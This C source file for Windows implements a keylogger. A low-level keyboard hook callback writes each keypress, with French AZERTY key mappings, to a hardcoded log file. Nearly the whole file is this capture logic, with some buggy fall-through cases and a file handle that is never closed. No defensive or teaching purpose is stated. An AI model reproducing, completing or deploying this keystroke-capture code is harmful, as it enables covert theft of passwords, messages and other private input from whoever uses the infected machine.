#include <Windows.h>
#include <stdio.h>
#include<WinUser.h>
#include <ctype.h>
#include <processthreadsapi.h>
#include <stdbool.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <stdbool.h>


KBDLLHOOKSTRUCT KeyBoardStruct;
HWND WindowClicked;
char *path = "C:/Users/arizz/Documents/C/RAKIETA/logs/logs.txt";



LRESULT CALLBACK LowLevelKeyboardProc(
  _In_ int    nCode,
  _In_ WPARAM wParam,
  _In_ LPARAM lParam
){


  if(nCode< 0) return CallNextHookEx(NULL, nCode, wParam, lParam);

  
    /*If the high-order bit is 1, the key is down; otherwise, it is up.
If the low-order bit is 1, the key is toggled. A key, such as the CAPS LOCK key, 
is toggled if it is turned on. The key is off and untoggled if the low-order bit is 0. 
A toggle key's indicator light (if any) on the keyboard will be on when the key is toggled, 
and off when the key is untoggled.*/
    KeyBoardStruct = *(KBDLLHOOKSTRUCT*)lParam;
    FILE* logs= fopen(path, "a+");

    if(( GetKeyState(VK_SHIFT) & 0x8000 ) != 0||(GetKeyState(VK_CAPITAL) & 0x0001) !=0){
      if(wParam == WM_KEYDOWN){
        switch (KeyBoardStruct.vkCode)
        {
                case VK_SHIFT:
                   break;
                case VK_CAPITAL:
                    
                    break;
                case VK_CONTROL:
                    break;
               
                //shitft de droite
                case VK_RSHIFT:
                    return CallNextHookEx(NULL, nCode, wParam, lParam);
                case VK_ESCAPE:
                    fprintf(logs, "escape");    
                    return CallNextHookEx(NULL, nCode, wParam, lParam);               
                case VK_TAB:
                    fprintf(logs,"<tab>\n");
                    return CallNextHookEx(NULL, nCode, wParam, lParam);
                /*case VK_SPACE:
                    fprintf(logs, "%c", 32);
                    printf("%c", 32);
                    CallNextHookEx(NULL, nCode, wParam, lParam);*/

                //commence a droite du n
                case VK_OEM_COMMA:
                //,?
                    fprintf(logs,"%c", 63);
                    printf("Point deinterro: %c",63);
                    return CallNextHookEx(NULL, nCode, wParam, lParam);

                case VK_OEM_PERIOD:
                //.;
                    fprintf(logs,"%c", 46 );
                    return CallNextHookEx(NULL, nCode, wParam, lParam);

                case VK_OEM_2:
                ///:
                    fprintf(logs,"%c", 47 );
                    return CallNextHookEx(NULL, nCode, wParam, lParam);

                case VK_OEM_8:
                //§!
                    fprintf(logs,"%c", 26 );   

                    return CallNextHookEx(NULL, nCode, wParam, lParam);
                case VK_OEM_3:
                //%ù
                    fprintf(logs, "%c", 37);
                    return CallNextHookEx(NULL, nCode, wParam, lParam);

                case VK_OEM_5:
                //µ*
                    fprintf(logs, "%c", 181);
                   return CallNextHookEx(NULL, nCode, wParam, lParam);

                case VK_OEM_6:
                //^¨
                    fprintf(logs, "%c", 168);
                   return CallNextHookEx(NULL, nCode, wParam, lParam);

                case VK_OEM_1:
                //$£
                    fprintf(logs, "%c", 163);
                   return CallNextHookEx(NULL, nCode, wParam, lParam);

                case VK_OEM_4:
                //°)
                    fprintf(logs, "%c", 41);

                    return CallNextHookEx(NULL, nCode, wParam, lParam);
                case VK_OEM_PLUS:
                // +=
                    fprintf(logs, "%c", 43);
                    printf("%c", 43);
                    return CallNextHookEx(NULL, nCode, wParam, lParam);
                case VK_OEM_7:
                    fprintf(logs, "<oCarre>");
                    return  CallNextHookEx(NULL, nCode, wParam, lParam);

                /*------------------------Pavé numérique----------------------------*/
                case VK_DIVIDE:
                    fprintf(logs, "%c", 47);
                    return CallNextHookEx(NULL, nCode, wParam, lParam);
                case VK_MULTIPLY:
                    fprintf(logs, "%c", 47);
                   return CallNextHookEx(NULL, nCode, wParam, lParam);
                case VK_SUBTRACT:
                    fprintf(logs, "%c", 47);
                   return CallNextHookEx(NULL, nCode, wParam, lParam);
                case VK_ADD:
                    fprintf(logs, "%c", 43);
                   return CallNextHookEx(NULL, nCode, wParam, lParam);
                case VK_RETURN:
                    
                   return CallNextHookEx(NULL, nCode, wParam, lParam);
                case VK_DELETE:
                    fprintf(logs, "%c", 46);
                  return  CallNextHookEx(NULL, nCode, wParam, lParam);
                case VK_INSERT:
                    fprintf(logs, "%c", 48);
                  return  CallNextHookEx(NULL, nCode, wParam, lParam);
                case VK_END:
                    fprintf(logs, "%c", 49);
                   return CallNextHookEx(NULL, nCode, wParam, lParam);
                case VK_DOWN:
                    fprintf(logs, "%c", 50);
                case VK_NEXT:
                    fprintf(logs, "%c", 51);
                   return CallNextHookEx(NULL, nCode, wParam, lParam);
                case VK_LEFT:
                    fprintf(logs, "%c", 52);
                  return  CallNextHookEx(NULL, nCode, wParam, lParam);
                case VK_CLEAR:
                    fprintf(logs, "%c", 53);
                   return CallNextHookEx(NULL, nCode, wParam, lParam);
                case VK_RIGHT:
                    fprintf(logs, "%c", 54);
                   return CallNextHookEx(NULL, nCode, wParam, lParam);
                case VK_HOME:
                    fprintf(logs, "%c", 55);
                  return  CallNextHookEx(NULL, nCode, wParam, lParam);
                case VK_UP:
                    fprintf(logs, "%c", 56);
                  return  CallNextHookEx(NULL, nCode, wParam, lParam);
                case VK_PRIOR:
                    fprintf(logs, "%c", 57);
                  return  CallNextHookEx(NULL, nCode, wParam, lParam);
                default:
                    fprintf(logs, "%c", KeyBoardStruct.vkCode);
                    return CallNextHookEx(NULL, nCode, wParam, lParam);
        }
        printf("CapsLockON");
      }
      
    }
    else{
      if(wParam == WM_KEYDOWN){
        printf("CapLockOff");
        switch(KeyBoardStruct.vkCode){
                case VK_CAPITAL:
                  break;
                
                  case VK_SHIFT:
                   break;
                
                case VK_CONTROL:
                   break;
                /*-----------Touches du haut---------------*/
               
                case 0x30:
                    fprintf(logs,"%c", 224);
                    printf("%c", 224);
                    return CallNextHookEx(NULL, nCode, wParam, lParam);
                case 0x31:
                    fprintf(logs, "%c", 38);
                    printf("cela affiche bien: %c", 38);
                   return CallNextHookEx(NULL, nCode, wParam, lParam);
                case 0x32:
                    fprintf(logs, "%c", 233);
                    printf("cela affiche bien: %c", 130);
                  return  CallNextHookEx(NULL, nCode, wParam, lParam);
                case 0x33:
                    fprintf(logs, "%c", 34);
                    CallNextHookEx(NULL, nCode, wParam, lParam);
                case 0x34:
                    fprintf(logs, "%c", 39);
                  return  CallNextHookEx(NULL, nCode, wParam, lParam);
                case 0x35:
                    fprintf(logs, "%c", 40);
                    CallNextHookEx(NULL, nCode, wParam, lParam);
                case 0x36:
                    fprintf(logs, "%c", 45);
                  return  CallNextHookEx(NULL, nCode, wParam, lParam);
                case 0x37:
                    fprintf(logs, "%c", 232);
                  return  CallNextHookEx(NULL, nCode, wParam, lParam);
                case 0x38:
                    fprintf(logs, "%c", 95);
                   return CallNextHookEx(NULL, nCode, wParam, lParam);
                case 0x39:
                    fprintf(logs, "%c", 231);
                    
                   return CallNextHookEx(NULL, nCode, wParam, lParam);


                /*-------------Touches à droite du clavier ,;:!ù*^$)=----------------*/
                 case VK_OEM_PLUS:
                    fprintf(logs, "%c", 61);
                  return  CallNextHookEx(NULL, nCode, wParam, lParam);
                case VK_OEM_COMMA:
                //,?
                    fprintf(logs,"%c", 44);
                    printf("Point deinterro: %c",44);    
                case VK_OEM_PERIOD:
                //.;
                    fprintf(logs,"%c", 59 );
                  return  CallNextHookEx(NULL, nCode, wParam, lParam);
                case VK_OEM_2:
                ///:
                    fprintf(logs,"%c", 58 );
                 return   CallNextHookEx(NULL, nCode, wParam, lParam);
                case VK_OEM_8:
                //§!
                    fprintf(logs,"%c", 245 );   
                 return   CallNextHookEx(NULL, nCode, wParam, lParam);
                case VK_OEM_3:
                //%ù
                    fprintf(logs, "%c", 37);
                  return  CallNextHookEx(NULL, nCode, wParam, lParam);
                case VK_OEM_5:
                //µ*
                    fprintf(logs, "%c", 230);
                  return  CallNextHookEx(NULL, nCode, wParam, lParam);
                case VK_OEM_6:
                //^¨
                    fprintf(logs, "%c", 249);
                  return  CallNextHookEx(NULL, nCode, wParam, lParam);
                case VK_OEM_1:
                //$£
                    fprintf(logs, "%c", 156);
                   return CallNextHookEx(NULL, nCode, wParam, lParam);
                case VK_OEM_4:
                //°)
                    fprintf(logs, "%c", 41);
                
                      return  CallNextHookEx(NULL, nCode, wParam, lParam);     
                 /*------------------------Pavé numérique----------------------------*/
                case VK_DIVIDE:
                    fprintf(logs, "%c", 47);
                   return CallNextHookEx(NULL, nCode, wParam, lParam);
                case VK_MULTIPLY:
                    fprintf(logs, "%c", 47);
                   return CallNextHookEx(NULL, nCode, wParam, lParam);
                case VK_SUBTRACT:
                    fprintf(logs, "%c", 47);
                   return CallNextHookEx(NULL, nCode, wParam, lParam);
                case VK_ADD:
                    fprintf(logs, "%c", 43);
                  return  CallNextHookEx(NULL, nCode, wParam, lParam);
                case VK_RETURN:
                    fprintf(logs, "%c", 10);
                  return  CallNextHookEx(NULL, nCode, wParam, lParam);
                case VK_DELETE:
                    fprintf(logs, "%c", 46);
                   return CallNextHookEx(NULL, nCode, wParam, lParam);
                case VK_INSERT:
                    fprintf(logs, "%c", 48);
                  return  CallNextHookEx(NULL, nCode, wParam, lParam);
                case VK_END:
                    fprintf(logs, "%c", 49);
                 return   CallNextHookEx(NULL, nCode, wParam, lParam);
                case VK_DOWN:
                    fprintf(logs, "%c", 50);
                case VK_NEXT:
                    fprintf(logs, "%c", 51);
                  return  CallNextHookEx(NULL, nCode, wParam, lParam);
                case VK_LEFT:
                    fprintf(logs, "%c", 52);
                   return CallNextHookEx(NULL, nCode, wParam, lParam);
                case VK_CLEAR:
                    fprintf(logs, "%c", 53);
                   return CallNextHookEx(NULL, nCode, wParam, lParam);
                case VK_RIGHT:
                    fprintf(logs, "%c", 54);
                  return  CallNextHookEx(NULL, nCode, wParam, lParam);
                case VK_HOME:
                    fprintf(logs, "%c", 55);
                   return CallNextHookEx(NULL, nCode, wParam, lParam);
                case VK_UP:
                    fprintf(logs, "%c", 56);
                    return CallNextHookEx(NULL, nCode, wParam, lParam);
                case VK_PRIOR:
                    fprintf(logs, "%c", 57);
                    return CallNextHookEx(NULL, nCode, wParam, lParam); 
                 default:
                    fprintf(logs, "%c", tolower(KeyBoardStruct.vkCode));
                    return CallNextHookEx(NULL, nCode, wParam, lParam);   
            }
      }  
    }
   return  CallNextHookEx(NULL, nCode, wParam, lParam);  
}